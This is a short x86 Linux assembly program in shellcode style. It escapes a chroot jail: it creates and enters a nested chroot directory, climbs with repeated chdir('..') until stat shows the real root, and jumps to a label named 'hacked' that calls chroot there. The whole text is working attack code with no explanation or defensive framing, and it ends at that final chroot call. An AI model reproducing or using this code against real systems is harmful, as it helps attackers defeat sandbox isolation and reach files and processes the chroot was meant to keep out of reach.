.globl main

main:
  xorl	%edx, %edx

  pushl %edx
  pushl  $0x2e2e2e2e

  movl  %esp, %ebx
  movw  $0x01ed, %cx

  leal  0x27(%edx), %eax
  int   $0x80

  leal	61(%edx), %eax
  int	$0x80

  xorl	%esi, %esi

loop:
  pushl	%edx
  pushw	$0x2e2e
  movl	%esp, %ebx

  leal	12(%edx), %eax
  int	$0x80

  pushl	%edx
  push	$0x2e
  movl	%esp, %ebx

  subl	$88, %esp
  movl	%esp, %ecx

  leal	106(%edx), %eax
  int 	$0x80

  movl	0x4(%ecx), %edi
  cmpl  $0x2, %edi
  je	hacked

  incl	%esi
  cmpl	$0x64, %esi
  jl	loop

hacked:
  pushl	%edx
  push	$0x2e
  movl	%esp, %ebx

  leal	61(%edx), %eax
  int $0x80
